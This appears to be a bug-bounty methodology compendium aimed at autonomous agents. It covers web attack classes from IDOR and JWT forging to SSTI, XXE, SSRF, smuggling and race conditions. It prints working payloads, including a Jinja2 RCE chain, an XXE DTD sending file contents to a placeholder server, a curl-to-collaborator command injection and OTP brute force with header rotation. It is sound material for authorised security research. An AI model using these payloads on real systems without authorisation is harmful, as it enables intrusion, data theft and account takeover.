# Track 2: Technical Vulnerability Mastery — The Complete Elite Arsenal (2024–2026)

> Research mission: the complete technical arsenal of elite bug bounty hunters, 2024–2026.
> Compiled from 6 parallel research tracks grounded in HackerOne/Bugcrowd/Intigriti disclosed reports,
> PortSwigger research (Kettle, Heyes), Project Zero, Assetnote, Bishop Fox, and 2024–2026 writeups.
> Focus: ACTIONABLE testing procedures encodable as autonomous-agent behaviors.

**Legend:** each class carries `AUTOMATABLE` / `HYBRID` / `HUMAN-INTUITION` — a rating of how much of the
hunting process an AI agent can own today.

---

## PART 1 — ACCESS CONTROL & AUTH

### 1.1 IDOR / BOLA (Broken Object-Level Authorization)

**Description.** The server trusts a client-supplied object identifier (URL path, query param, header, body field)
without verifying ownership. The 2024–2026 surface shifted from sequential numeric IDs to **tenant-context
headers** on multi-tenant SaaS (`Tenantid`, `X-Org-Id`, `X-Tenant-ID`), GraphQL field-level gaps, and SCIM
path-vs-body identifier mismatches.

**How elites find it (concrete steps):**
1. Build a two-account harness (A attacker, B victim). Proxy every feature as A; log every request carrying an
   object identifier — path IDs, query params, body fields, custom headers, cookies.
2. Replay A's requests with B's identifiers swapped; test read, update, delete verbs separately (write-IDOR pays more).
3. Fuzz tenant-context headers: `Tenantid: 3`→`2`, `X-Org-Id`, `X-Tenant-ID`, `X-Project-Id`, `environmentId`,
   `channel`, `is-multi-tenant-query: true` — diff responses for cross-tenant data.
4. GraphQL pivots: when `project(id:)` is checked, reach the object through a parent — `organization(id:){ projects { id, sensitive } }`.
5. Test path-vs-body identifier mismatches (`PUT /scim/v2/Users/123` with body `"id":"456"` — which wins?).
6. Decode obfuscated identifiers (base64/hashids) — deterministic encodings are still enumerable.
7. Tooling: Burp **Autorize** (auto-replay under low-priv session, diff status/length), **Authz**, Arjun, `inql`.

**Famous examples:** Kia 2024 (Sam Curry — dealer-portal channel-header → cross-account PII + remote unlock/start of any post-2013 Kia, ~30s); PayPal IDOR #415081 → **$10,500**; HackerOne GraphQL mutation IDOR (Dec 2025, `certificationId` swap → delete anyone's certifications) → **$12,500**; OneUptime CVE-2026-30956 (CVSS 9.9, tenant-header BOLA → reset-token leak → ATO).

**Chaining:** IDOR read → leak `resetPasswordToken`/emails → password reset → ATO; IDOR write on email-change API → swap victim email → reset → silent ATO.

**Rating:** HYBRID — enumeration and Autorize replays automatable; discovering *which* identifiers are attacker-controlled (headers, GraphQL pivots, path-vs-body) needs human intuition.

### 1.2 Mass Assignment / Auto-Binding

**Description.** Frameworks auto-bind request data to models (`data: {...req.body}` into Prisma/Mongoose, Rails `params`,
Laravel `$fillable`, ASP.NET model binding). Extra fields like `role`, `is_admin`, `is_verified`, `plan` get silently applied.

**How elites find it:**
1. Intercept PUT/PATCH/POST to `/api/user`, `/api/settings`, `/api/account`, preferences, newsletter, avatar endpoints.
2. Append candidate privileged fields: `{"role":"admin"}`, `{"is_admin":true}`, `{"roleid":2}`, `{"is_verified":true}`, `{"plan":"premium"}`, `{"balance":999999}`.
3. Verify persistence, not just 200s: `GET /api/user` after mutation; re-login (session may cache old role); check `/admin`.
4. Run Arjun on write endpoints to discover accepted hidden params (blind mass assignment).
5. Test both JSON and form encodings — ASP.NET `[BindNever]` blocks form binding but NOT JSON input formatters.
6. Hit non-obvious writes: password-change, avatar-upload, address forms often bind the whole body.

**Famous examples:** PortSwigger canonical pattern — `POST /my-account/change-email` + `{"roleid":2}` → admin panel; Express/Prisma `PATCH /api/users/me/preferences` spread → `{"role":"ADMIN"}` self-promotion in one request (2025).

**Chaining:** self-promotion to admin unlocks every admin-only bug; `team_id`/`org_role` crosses tenant boundaries; admin panels expose mass PII → IDOR amplification.

**Rating:** AUTOMATABLE — parameter injection + GET-diff verification is a scriptable loop.

### 1.3 Authentication Bypass (logic flaws, 2FA/MFA bypass, reset poisoning)

**Description.** Logic flaws in identity verification: unenforced second factors, short-circuitable password checks, or
password-reset links built from attacker-controlled Host headers. 2024–2026 highest yield: 2FA enforcement gaps and reset poisoning.

**How elites find it:**
1. **2FA skip:** after valid login, land on `/2fa`, then replace the URL with `/my-account` — if it loads, 2FA is unenforced server-side.
2. **Response flipping:** Burp Match-and-Replace `{"success":false}`→`{"success":true}`, or 401→200 on the verify response.
3. **Client-bound identity:** watch for `verify=carlos` cookies or `user_id` in OTP JSON — swap to victim and brute-force.
4. **OTP brute force:** no rate limit on `POST /api/verify-2fa` → attack 4-digit (10k, ~2 min at 20 threads) or 6-digit space; rotate `X-Forwarded-For` per attempt to beat naive IP limits.
5. **Method conversion:** replay login POST as GET (`GET /login?username=..&password=..`) — some stacks skip MFA on the GET path (Liferay **CVE-2025-3639**, unauthenticated MFA bypass).
6. **Parameter pollution:** `username=victim&username=attacker` — desync authenticated vs authorized identity.
7. **Reset poisoning matrix:** `POST /forgot-password` with injected `Host: evil-collaborator`, `X-Forwarded-Host`, `X-Host`, dual `Host:` headers, `target.evil.com`, `target:1@evil.com`. Confirm by reading your own inbox — token link must carry the attacker host. OOB proof via Collaborator when a victim clicks.

**Famous examples:** Liferay CVE-2025-3639 (2025, unauthenticated MFA bypass); Omise 2FA bypass H1 #3356149 ($500+, client-side flag flip); session-replay H1 #3120790 ($1,000+); Starbucks ATO H1 #876300 (reset/email-change logic flaw).

**Chaining:** 2FA bypass converts leaked credential lists into mass ATO; reset poisoning + stored XSS auto-requesting resets scales it; parameter pollution → email change → reset → ATO.

**Rating:** HYBRID — OTP brute force and header-injection matrices automatable; discovering the *specific* logic gap (which step is unenforced, which header the reset builder trusts) needs human flow analysis.

### 1.4 JWT Attacks

**Description.** JWTs are only as trustworthy as the verifier. Elites forge tokens via `alg:none`, RS256→HS256 confusion
(sign with the public key as HMAC secret), weak crackable secrets, attacker-controlled `kid`/`jku`/`x5u` resolution, and
unenforced `exp`/`aud`/`iss` claims.

**How elites find it:**
1. Recon: decode tokens, probe `/.well-known/jwks.json`, grep JS for embedded public keys.
2. Always try `alg:none` first (free): `header.payload.` with case variants `None`/`NONE`/`nOnE`. Tool: `jwt_tool -X a`, Burp JWT Editor.
3. RS256→HS256: fetch JWKS → convert to PEM → re-sign edited payload with HS256 using the public key as HMAC secret. Try multiple key formats.
4. `kid` injection: path traversal `{"kid":"../../../../../../../dev/null"}` + empty secret; `../../../etc/passwd`; SQLi/command injection if key lookup is DB/shell-backed.
5. `jku`/`x5u` SSRF: host your own JWKS, set `jku` to it with matching `kid`; sign with your private key. Chain allowlist bypasses via open redirects on target domain.
6. Embedded `jwk` header: some verifiers trust inline keys without provenance checks.
7. Weak secret cracking: `hashcat -m 16500` or `jwt_tool -C -d rockyou.txt` (real 2026 case: secret was `"default"` → ATO, $1,500).
8. Claim confusion: delete `exp`, swap `aud`/`iss`, cross-service token replay, tenant-claim swaps (`org_id`, `tenant_id`) → cross-tenant IDOR.
9. Prove cross-identity impact: aim forged token at `/admin` or another user's data — a 200 on your own data proves nothing.

**Famous examples:** YesWeHack 2026 weak-secret ATO ($1,500, Critical); H1 #1103582 leaked JWT to unauthorized Jira users ($3,000); alg-confusion CVE families 2024–2026 (CVE-2024-37568, CVE-2024-54150, CVE-2025-61152).

**Chaining:** forged admin JWT unlocks admin IDOR surfaces; claim swaps → cross-tenant compromise; `jku`/`x5u` doubles as SSRF primitive.

**Rating:** AUTOMATABLE — the forge matrix is a finite scriptable loop; human judgment only in claim-name selection.

### 1.5 OAuth 2.0 / OIDC Flaws

**Description.** OAuth security lives in URL parsing and state-machine transitions. Unvalidated `redirect_uri` → code/token theft;
missing `state` → login CSRF; unenforced PKCE → stolen codes directly exchangeable; open redirects on client domain → code delivery service.

**How elites find it:**
1. Intercept the full flow; capture `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `code_challenge`.
2. Mutate `redirect_uri` in Repeater: arbitrary domain, `client.com.attacker.com`, `client.com%2Eattacker.com`, `client.com@attacker.com`, path traversal `…/oauth-callback/../evil-path`, query-appended. Vulnerable signal: 302 `Location: <your-uri>?code=NEW_CODE` with no error.
3. Chain known open redirects on the client domain as `redirect_uri`.
4. Steal code end-to-end: iframe the malicious authorize URL on an exploit server, recover `code` from access logs, redeem at legitimate callback → victim session.
5. Omit `state`: if flow completes → login CSRF (victim's session binds to attacker's account → payment-detail theft).
6. PKCE downgrade: replay with `code_challenge_method=plain` or no challenge; test whether token endpoint enforces `code_verifier`.
7. Custom OIDC: fetch `/.well-known/openid-configuration` on auth domains; test dynamic client registration `logo_uri` → SSRF (server fetches it → pivot to `169.254.169.254`).
8. Pre-account takeover: password-signup + OAuth on same email without ownership verification → register victim's email first.

**Famous examples:** PortSwigger OAuth research corpus (Thatcher et al. — redirect_uri parser inconsistencies); Booking.com OAuth chain (Salt Labs, ~500M MAU exposure); canonical OAuth ATO payouts $500–$20,000+.

**Chaining:** open redirect → redirect_uri bypass → code theft → ATO; leaked `client_secret` from JS bundles → token-endpoint impersonation.

**Rating:** HYBRID — mutation matrices scriptable; victim-interaction delivery and parser-desync spotting need human flow reasoning.

---

## PART 2 — INJECTION

### 2.1 SQL Injection

**Description.** 2024–2026 hunting is about blind/time-based extraction behind WAFs, second-order injections, and ORM/GraphQL
edge cases — not classic `OR 1=1`.

**How elites find it:**
1. Map inputs: params, cookies, headers (`User-Agent`, `Referer`, `X-Forwarded-For` — often logged unsanitized), JSON, GraphQL args, SOAP bodies.
2. Fingerprint DBMS: `'` for errors; `SLEEP(5)`/`pg_sleep(5)`/`WAITFOR DELAY`/`DBMS_PIPE.RECEIVE_MESSAGE` behavioral probes.
3. Cheap confirmation: `UNION SELECT NULL--`, `1 AND 1=1` vs `1 AND 1=2`, divide-by-zero errors.
4. WAF bypass ladder (never stop after 3–5 probes): `%09`/`%0A`/`/**/` spaces, `/*!50000UNION*/` versioned comments, case variation, `OR`→`||`, XML/HTML encoding in SOAP (`&#x53;ELECT`), double URL-encoding, HPP (`?page=1&page=1' UNION SELECT--`), chunked `Transfer-Encoding`, header injection.
5. Blind: boolean diffs + time-based; apply to GraphQL resolver args (under-hunted).
6. Second-order: inject into profile/name fields, trigger the admin/render flow that consumes them later.
7. Automate confirmed params: `sqlmap -p param --batch --risk=2 --level=3 --tamper="between,randomcase,space2comment" --technique=BT`.
8. Proof discipline: dump ONE benign row (`GROUP_CONCAT`) — never full customer data.

**Famous examples:** Valve `report_xml.php` `countryFilter[]` → **$25,000** (highest disclosed SQLi); Nextcloud 2026 CVE-2026-45545; Rocket.Chat SQLi → auth bypass; Mail.ru time-based → **$15,000**.

**Chaining:** auth bypass → admin; `xp_cmdshell`/`INTO OUTFILE` → RCE; stolen session tokens/hashes → ATO; second-order into admin-rendered fields → stored XSS.

**Rating:** HYBRID — detection/extraction automatable; WAF-bypass ladder and second-order reasoning need humans.

### 2.2 XSS (all contexts)

**Description.** The 2024–2026 game is context + CSP: strict CSP killed naive payloads, so hunters bypass via allowed CDNs +
JSONP/Angular gadgets, open-redirect + CSP path-ignoring, nonce leaks, parser differentials; plus mutation XSS and SVG/CSV/PDF/email vectors.

**How elites find it:**
1. Baseline per context: HTML `"><img src=x onerror=alert(1)>`, JS-string `'-alert(1)-'` / `</script><script>`. Tools: `dalfox`, `xsstrike`.
2. Read the CSP header; run CSP Evaluator. Trivial wins: `'unsafe-inline'`, `data:`, wildcard CDNs.
3. CSP bypass ladder: whitelisted CDN + Angular gadget; open redirect + CSP3 redirect path-ignoring (userinfo trick); nonce reflected from cookie → cookie-tossing; `object-src` open → `<object data="evil.svg">`; CRLF fake `Content-Length` truncation.
4. mXSS: fingerprint DOMPurify version; namespace-confusion payloads (`<math><mtext><table><mglyph><style>` class; CVE-2024-47875, CVE-2025-26791).
5. DOM: grep sinks (`innerHTML`, `eval`, `v-html`, `dangerouslySetInnerHTML`); audit `addEventListener('message')` for missing origin checks; DOM clobbering with DOM Invader.
6. File vectors: SVG upload served as `text/html`; CSV formula injection; PDF JS actions; EXIF metadata rendered into admin pages; profile-name → confirmation-email sinks.
7. If CSP is unbypassable, demonstrate scriptless impact (meta-refresh, password-manager autofill) — still reportable.

**Famous examples:** PayPal stored XSS via cache poisoning → **$18,900** + **$20,000** follow-up; stsewd SVG+CSP bypass → $1,500 (regression $2,500); Cyx `GIF89a`-masquerade + Angular CSP bypass (Dec 2025).

**Chaining:** stored XSS → session hijack/ATO; admin-panel XSS → CSRF admin actions; postMessage XSS → OAuth code theft; XSS → keylogging for lateral takeover.

**Rating:** HYBRID — reflection discovery automatable; CSP bypass design, mXSS chains, DOM clobbering need humans.

### 2.3 SSTI (Server-Side Template Injection)

**Description.** `{{7*7}}` → `49` means user input reaches a template engine — and object traversal turns the engine into a
REPL with OS command execution. Highest-paying under-hunted class: hunters probe XSS and miss template syntax; confirmed RCE pays $5k–$30k+.

**How elites find it:**
1. Polyglot probe: `${{<%[%'”}}%` — a 500 or garbled render = template context.
2. Arithmetic confirmation per family: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/Velocity), `<%= 7*7 %>` (ERB).
3. Fingerprint before RCE: `{{7*'7'}}` — response difference distinguishes Jinja2 vs Twig (verify empirically; don't hardcode).
4. Escalate: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`; Twig `{{_self.env.registerUndefinedFilterCallback("exec")}}`; ERB `<%= \`id\` %>`.
5. Filter bypasses: hex escapes via `|attr()` when `__` is blacklisted (`\x5f\x5f`); keyword args when quotes are stripped.
6. Hunt lazy concatenation: name fields → confirmation emails ("Hello 49" arrives by email), PDF generators, error pages, CMS previews.
7. Prove with `id`/`whoami` only — then stop.

**Famous examples:** Uber Flask Jinja2 → **$10,000**; Intigriti Nov 2025 challenge (JWT `alg:none` → admin → Jinja2 SSTI → RCE); FortiPy (2025) SSTI past `__`/`os`/`popen` blacklist → root.

**Chaining:** SSTI → RCE (terminal); `{{config}}` → SECRET_KEY → session forgery → admin; template RCE → cron/SSH persistence.

**Rating:** HUMAN-INTUITION — probing automates; fingerprinting, filter-bypass gadget chains, second-hop sinks need humans.

### 2.4 XXE (XML External Entity)

**Description.** Server-side XML parsers resolve attacker entities → file reads or SSRF. Most XXE is blind in 2024–2026: the elite
primitive is two-stage parameter-entity + remote-DTD out-of-band exfiltration; filters blocking general entities often still allow `%` parameter entities.

**How elites find it:**
1. Find XML surfaces: `application/xml` endpoints, SOAP WSDL, SAML, SVG/DOCX/XLSX uploads (unzip OOXML, edit, rezip).
2. Classic probe: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → `root:x:0:0:` in response.
3. Blind: `<!ENTITY % x SYSTEM "http://<collaborator>/"> %x;` → callback confirms. Test parameter entities separately when general entities are blocked.
4. Two-stage OOB exfil: `evil.dtd` with `<!ENTITY % all "<!ENTITY send SYSTEM 'http://<server>/?data=%file;'>">` — file contents arrive in server logs. Error-based fallback if HTTP OOB blocked.
5. PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`. XInclude when DOCTYPE blocked entirely.
6. SSRF pivot: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` via entity.

**Famous examples:** Uber blind OOB XXE ($500); Open-Xchange blind XXE via PPTX ($2,000); Adobe Magento "CosmicSting" CVE-2024-34102 (CVSS 9.8, nested deserialization → XXE → crypt key → admin token → RCE).

**Chaining:** file read → secrets → session forgery; XXE → SSRF → cloud metadata → cloud takeover; PHP `expect://id` → direct RCE; XXE + XSLT → RCE on Java stacks.

**Rating:** HYBRID — in-band probing and OOB callbacks automatable; DTD exfiltration design and parser-specific wrappers need humans.

### 2.5 Command Injection / RCE Escalation Chains

**Description.** Not one vuln type but an escalation ladder: any code-evaluation primitive (SSTI, XXE+expect, deserialization,
template upload) is a stepping stone to `id`/`whoami` output.

**How elites find it:**
1. Target classic sinks: ping/dig/traceroute utilities, PDF/image converters, sendmail wrappers, archive extraction, admin diagnostics, forgotten debug endpoints.
2. Separator ladder: `;`, `&&`, `|`, backticks, `$()`, `%0a`, `${IFS}`, glob `/???/cat /etc/passwd`; Windows `& whoami`, caret escapes.
3. Blind confirmation: `; sleep 5 #`; OOB: `; curl https://<collab>/$(whoami)`.
4. Escalation ladders per primitive: SSTI→RCE, XXE→RCE (PHP `expect://`), upload→RCE (`.htaccess`/`web.config`/polyglots), SQLi→OS (`xp_cmdshell`/`INTO OUTFILE`), SSRF→RCE (Redis cron write).
5. Tools: `commix`, nuclei command-injection templates, Burp Collaborator.
6. Proof discipline: `id`/`whoami` only; never persistent/destructive commands on live programs.

**Famous examples:** Eslam Gamal forgotten `test.aspx` → OS command injection (Bugcrowd, P2, Oct 2025); X/Twitter pre-auth RCE on VPN → **$20,160**; GitLab DecompressedArchiveSizeValidator RCE → **$33,510**.

**Chaining:** command injection is terminal — from there: persistence, credential harvesting, lateral movement.

**Rating:** HUMAN-INTUITION — sink discovery needs business-logic context; filter evasion and multi-step escalation are human work.

---

## PART 3 — SERVER-SIDE REQUEST & PROTOCOL TRICKS

### 3.1 SSRF

**Description.** Forcing the backend to issue requests to attacker-chosen destinations — internal services, cloud metadata,
non-HTTP schemes. Modern SSRF lives in URL-fetch features (webhooks, import-from-URL, PDF generators, avatar-by-URL), and
impact escalates steeply with full vs blind response.

**How elites find it:**
1. Map every server-fetch feature: `url=`, `src=`, `webhook=`, `callback=` params/JSON fields; PDF/export endpoints; import-from-URL; `Referer`-following analytics.
2. Burp Collaborator in the candidate field — a lone DNS lookup confirms blind SSRF.
3. Aim at cloud metadata: AWS `169.254.169.254` (+ IMDSv2 token dance), GCP `metadata.google.internal` + `Metadata-Flavor`, Azure + `Metadata: true`, Alibaba `100.100.100.200`, ECS `169.254.170.2`.
4. Internal port-scan differential: `:6379` (Redis), `:9200` (Elastic), `:2375` (Docker = RCE), `:8080` (admin). ECONNREFUSED vs ETIMEDOUT maps open vs filtered.
5. Parser differentials vs filters: decimal/octal/hex/short IP forms, `[::ffff:127.0.0.1]`, `@`-confusion, 302-redirect hops (validation-time vs request-time), DNS rebinding.
6. PDF renderers: SVG with `foreignObject`/iframe to internal hosts — headless Chrome often fetches without app filters.

**Famous examples:** Capital One (SSRF → AWS metadata → 100M records, ~$190M cost); Meta payout table: full SSRF up to **$40,000**, blind **$30,000**; Shopify Exchange headless-screenshooter → GCP metadata → container root ($25,000).

**Chaining:** SSRF → metadata creds → IAM → cloud takeover (Critical); SSRF → Docker/Redis → RCE; SSRF → internal admin panels.

**Rating:** HYBRID — Collaborator injection and differential sweeps automatable; spotting subtle validation gaps (save-time vs request-time) needs humans.

### 3.2 HTTP Request Smuggling

**Description.** Front-end/back-end disagree on request boundaries; the tail of one request becomes the start of the next.
Kettle's 2025 "HTTP/1.1 Must Die" expanded the taxonomy to CL, TE, implicit-zero (0), H2 → variants CL.0, 0.CL, TE.0, Expect-based desyncs.

**How elites find it:**
1. Burp **HTTP Request Smuggler v3.0** — covers CL.0/0.CL/TE.0/Expect/H2-downgrade + V-H/H-V parser-discrepancy model. Disable auto Content-Length normalization.
2. Classic differentials over one connection: CL.TE probe with `SMUGGLED` prefix; TE.CL with `GPOST` gadget; confirm via second response or timing on a separate connection.
3. 2025 path: send bodies to endpoints that never expect them (static files, redirects) → 0.CL deadlock; break with early-response gadgets (static file, `/con`, redirect endpoints); convert 0.CL→CL.0 via double-desync.
4. Expect probes: bare `Expect:`, obfuscated `Expect: y 100-continue` (Akamai CVE-2025-32094).
5. Escalation: capture victim requests (smuggle open `POST /comment`); response-queue poisoning (prefix fake `HTTP/1.1 200 OK`); smuggle `GET /admin` past front-end ACLs; feed into cache → persistent poison.
6. Safety: isolated test paths only; any cross-user response on your socket = stop immediately; check program rules (many forbid smuggling on prod).

**Famous examples:** Cloudflare H2.0 desync — 24M sites exposed ($7,000, cached redirect → persistent takeover); Akamai CVE-2025-32094 ($9,000); T-Mobile 0.CL ($12,000); GitLab Expect 0.CL ($7,000). 2025 campaign: **$350K+** total.

**Chaining:** smuggling → cache poisoning (persistent takeover); smuggling → auth bypass (`/admin` past ACLs); smuggling → session theft (pooled connections); browser-powered desync (victim's browser sends the poison — no proxy needed).

**Rating:** HYBRID — probes automatable (Smuggler v3.0); V-H/H-V discrepancy analysis and double-desync tuning are human work.

### 3.3 Web Cache Poisoning (+ Deception, CPDoS)

**Description.** Unkeyed inputs (headers/query/cookies not in the cache key) get stored by shared caches and served to all visitors.
Mirror image: cache deception stores a victim's private response at an attacker URL.

**How elites find it:**
1. Fingerprint cache: `CF-Cache-Status`, `X-Cache`, `Age` incrementing = cached.
2. Burp **Param Miner → Guess headers** for unkeyed headers: `X-Forwarded-Host`, `X-Host`, `X-Original-URL`, `Forwarded`, `User-Agent`, `Origin` (poisons CORS).
3. Cache-key mapping: vary each input with unique cache-buster `?cb=<random>`; inputs not affecting HIT/MISS are unkeyed.
4. Safe poison check: `GET /?cb=<random>` + `X-Forwarded-Host: evil.com`; re-request same `?cb` without the header — poisoned body = confirmed. Cache-buster mandatory (throwaway keys only).
5. Escalation: cached redirect → phishing for all; cached `ACAO: evil.com` → CORS takeover; reflected XSS into cached JS → mass stored XSS; cached cookie swap → session issues.
6. Fat GET: body on GET (cache ignores, origin reads); `;`-delimited params (`/home;admin=true` — cache keys `/home`, app honors param).
7. Deception matrix per CDN: `/account/settings.css`, `/account;.css`, `/account%2fsettings.css` — find where origin returns private page (200) but cache stores it as static.
8. CPDoS: unkeyed inputs causing cached 400/500 — `X-Forwarded-Port: 1` (cached 301), invalid `Transfer-Encoding` (cached 501).

**Famous examples:** PayPal stored XSS on `/signin` via cache poisoning → **$18,900**; PayPal DoS via cached 501 → $9,700; Shopify `X-Forwarded-Host` → $6,300; H1-on-H1 CPDoS → $2,500.

**Chaining:** reflected XSS → cached → mass stored XSS (highest-payout chain); smuggling → poisoned cache → persistent takeover; deception → PII/session harvest.

**Rating:** HYBRID — Param Miner + cache-buster confirm loop scriptable; per-CDN delimiter matrices and sink judgment need humans.

### 3.4 WebSocket Vulnerabilities

**Description.** The WS handshake is an HTTP request with `Upgrade` — CSRF/Origin protections often forgotten; per-message authorization usually missing after connect.

**How elites find it:**
1. Find WS endpoints: proxy WebSockets history, filter for `101 Switching Protocols`.
2. CSWSH test: replay handshake with `Origin: https://evil.com` and no `Origin` — a 101 = no validation. Build exploit page: `new WebSocket('wss://target/chat')` + `onmessage` exfil via Collaborator (browser attaches cookies automatically).
3. Cookie flags: `SameSite=None` makes CSWSH trivial.
4. Per-message auth: connect as low-priv User A, send frames referencing User B's objects/rooms — server often checks only at connect.
5. Message injection: intercept frames, fuzz payloads — stored XSS in chat/agent UIs, JSON template injection, XML frames → XXE.

**Famous examples:** Coda WebSocket CSRF report; PortSwigger CSWSH lab chain (chat exfil → credential theft → ATO); libcurl H1 #3474865 (Dec 2025, handshake accepted any `Sec-WebSocket-Accept`).

**Chaining:** CSWSH → live channel as victim → read messages + send actions → ATO; WS XSS → stored XSS on admins; per-message IDOR → cross-tenant leaks.

**Rating:** HYBRID — handshake probing and frame replay automatable; PoC delivery and per-message logic flaws need humans.

### 3.5 HTTP/2 Desync & Downgrade Smuggling

**Description.** H2's binary framing has no CL/TE ambiguity, but CDN→origin downgrade reintroduces length semantics — a FOURTH
length interpretation (CL, TE, 0, H2). Modern smuggling lives in the downgrade rewrite: H2.CL, H2.TE, H2.0, CRLF injection through binary headers, h2c tunneling.

**How elites find it:**
1. Confirm topology: ALPN `h2` to client, H1 to origin; inspect whether `content-length` survives the downgrade.
2. H2.CL: H2 POST with `content-length: 0` + body containing `GET /admin HTTP/1.1...` — front-end reads full body, back-end reads 0 bytes then parses body as next request.
3. H2.TE: `transfer-encoding: chunked` over H2 (must be stripped on downgrade) — misconfigured front-ends forward it → response-queue poisoning.
4. CRLF via H2 headers: binary headers can carry `\r\n` — inject as header value/name to split the downgraded request.
5. h2c upgrade: `Connection: Upgrade, HTTP2-Settings` + `Upgrade: h2c` — tunnel past front-proxy inspection (tool: `h2csmuggler`).
6. Kettle's H2.0: H2 GET with H1 request smuggled in "body" — downgrade leaks it as fresh request; deadly with caches (Cloudflare case).
7. Tooling: Request Smuggler v3.0 HTTP/2 probes, `http2smugl`, `smuggler.py`. Flagged as "lowest dup rate, $5K–$30K" under-hunted class (2025).

**Famous examples:** Cloudflare H2.0 ($7,000, 24M sites, cached redirect takeover); Basecamp H2 smuggling H1 #1211724; Node.js/Tomcat H2 CVEs 2024.

**Chaining:** H2 desync → cache poisoning (mass takeover); H2.CL `/admin` → ACL bypass; H2.TE → response theft; h2c → WAF bypass.

**Rating:** HYBRID — probes automatable; downgrade-rewrite confirmation and gadget conversion are human research.

---

## PART 4 — LOGIC, CONCURRENCY & MODERN WEB

### 4.1 Race Conditions

**Description.** Check-then-act gaps: apps assume requests are atomic, but Kettle (2023) proved every request passes through
~1ms sub-states. Single-packet H2 delivery (median spread 1ms vs 4ms) made races reliably exploitable; Flatt Security (2024)
pushed to 10,000 requests in ~166ms via first-sequence sync.

**How elites find it:**
1. Map check-then-act flows: coupon redeem, wallet transfer, checkout, OTP verify, vote/like, role-select, 2FA disable.
2. Establish before/after invariant (balance, coupon count); race "wins" when ≥2 mutually-exclusive successes occur.
3. Warm the connection; use ONE H2 connection multiplexing all streams (`engine=Engine.BURP2`).
4. Turbo Intruder single-packet: `engine.queue(req, gate='race1')` × 20–30, then `openGate` — final frames land in one TCP packet.
5. Quick check: Burp Repeater "Send group in parallel" (Aditya Bhatt 2025: coupon stacked 20× to near-zero).
6. Multi-endpoint: queue heterogeneous requests in one packet — `disable-2fa` + `sensitive-action`, `create` + `read` (partial construction → IDOR), login + admin-panel (accidental super-admin).
7. N>30: Flatt's first-sequence sync (IP fragmentation + TCP reordering).

**Famous examples:** Tanvi Chauhan loyalty-wallet race → **$15,000** P1 (Jun 2026); Aditya Bhatt coupon stacking (May 2025); nopCommerce CVE-2024-58248 gift-card double-redemption; Anmol Singh Yadav OAuth race → **$8,500** P1; H1 #429026 double-paid retest → $2,500.

**Chaining:** coupon ×N → free checkout; wallet → double-spend; OTP batching → MFA bypass; multi-endpoint → priv-esc; GraphQL alias batching × parallel HTTP → race amplification.

**Rating:** HYBRID — synchronization automatable; state-machine modeling and multi-endpoint attack design need humans.

### 4.2 Business Logic Flaws

**Description.** Violations of business intent — price math, workflow order, quota rules — that no scanner signature covers.
Highest-paying single-finding class on SaaS/fintech (direct financial loss).

**How elites find it:**
1. State-machine map every money/privilege flow; test steps in isolation and out of order.
2. Price/quantity ladder: `quantity=-100`, `price=-99.99`, `cart=-1` (Bagisto **CVE-2025-56426**: `-1` → $0 order; AlegroCart: `-100` → -$1,599 subtotal).
3. Coupon ladder: double-apply → stack incompatible → reuse expired → race-stack → validate-vs-redeem TOCTOU.
4. Workflow skipping: replay later steps first (skip email verification/payment/KYC); tamper step tokens/order-ids.
5. Negative-value abuse: negative refund/transfer (sender balance increases), negative quantity → credit.
6. Trial/quota: flip `hasEverTrialed`, email-alias resets, password-change → trial reset, device-fingerprint evasion.
7. MFA bypass via reset path; SSO-migration/pre-registration account claim.
8. Referral: self-referral, circular chains, multi-account farming; invite privilege confusion.
9. Reorder/replay mutations with substituted object IDs.

**Famous examples:** Bagisto CVE-2025-56426 ($0 orders); Lilishop CVE-2024-50654 coupon TOCTOU (CVSS 7.5); historical: Tesla 2020 free upgrades, Uber 2016 infinite promos.

**Chaining:** negative-price + refund logic → cash-out; referral farming × mass accounts → bonus harvesting; 2FA-bypass via reset → ATO.

**Rating:** HUMAN-INTUITION — scanners can't know intended business rules; automation tops out at numeric ladders.

### 4.3 GraphQL Vulnerabilities

**Description.** One `/graphql` endpoint exposes the whole data model; every resolver needs its own authz check — most schemas miss them.
Covers introspection, field-level IDOR, batching/aliasing abuse, nested traversal, persisted-query bypasses, REST↔GraphQL desyncs.

**How elites find it:**
1. Discovery: probe `/graphql`, `/api/graphql`, `/query`; grep JS for `__typename`, `operationName`, `{"query":`.
2. Introspection: full `__schema` query; if blocked, `{ __typename }` then field-suggestion errors ("Did you mean?").
3. Blind recovery: `clairvoyance` (~80% schema via suggestion errors), `graphql-cop`.
4. IDOR: swap IDs in `user(id:)`, `node(id:)`; decode relay global IDs (`gid://shopify/BillingInvoice/<shop>`) → cross-tenant (Shopify H1 #2207248 → **$5,000**).
5. Nested pivot: `user(id){ orders { items { price } } }` — child resolvers often unchecked.
6. Mutation IDOR: replay delete/update mutations as low-priv (pays more than query IDOR; H1 #2218334 Copilot case).
7. Batching: array of 100 queries in one request (rate-limit bypass); alias batching `v1: verifyOtp("0001") v2: ...` → 1000 OTP guesses per RTT → 2FA bypass.
8. DoS: nested fragments `fragment F on User { repos { teams { members { ...F } } } }`.
9. Persisted queries: fallback to ad-hoc when hash mismatches; dev/staging without whitelisting.
10. REST↔GraphQL desync: revoke via REST, re-assert via GraphQL mutation.
11. Subscriptions: `wscat` to `wss://target/graphql` — auth-once on connect is common.

**Famous examples:** H1 #489146 unauthenticated GraphQL → all users' emails/backup_codes/TOTP state → **$20,000**; Shopify H1 #2207248 → $5,000; Harshdranjan `certificationId` mutation IDOR → **$12,500** (Dec 2025).

**Chaining:** introspection + field-IDOR → mass PII; field-IDOR email + `resetPassword` mutation → ATO; alias-batching + OTP → 2FA bypass; batching + login → 1000× stuffing; CSRF via GET mutations.

**Rating:** HYBRID — schema recovery and batching automatable; per-resolver authz gaps and REST↔GraphQL desyncs need manual differential testing.

### 4.4 Prototype Pollution

**Description.** Attacker input reaches unsafe merge sinks (`_.merge`, `qs`, JSON-path assignment) → writes onto `Object.prototype`.
Client-side: polluted defaults reach DOM sinks (XSS). Server-side Node.js: polluted options reach `child_process` gadgets (RCE).

**How elites find it:**
1. Probe: `{"__proto__":{"polluted":"1"}}`, `/?__proto__[foo]=bar`, nested `{"constructor":{"prototype":{"key":"val"}}}`, bypasses `__pro__proto__to__`.
